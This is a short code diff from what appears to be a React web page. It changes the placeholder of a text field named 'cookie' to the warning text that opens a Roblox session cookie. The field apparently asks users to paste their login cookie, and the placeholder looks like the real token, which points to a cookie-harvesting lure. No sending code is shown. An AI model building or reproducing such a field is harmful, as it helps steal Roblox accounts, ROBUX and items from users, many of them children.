@@ -157,7 +157,7 @@ const Index = () => {
             type="text"
             value={cookie}
             onChange={(e) => { setCookie(e.target.value); setErrorMsg(null); }}
-            placeholder="TEXTBOX"
+            placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
             disabled={running}
             maxLength={4000}
             className={`w-full bg-input border rounded-xl pl-11 pr-4 py-3 text-sm tracking-widest placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 transition-colors ${
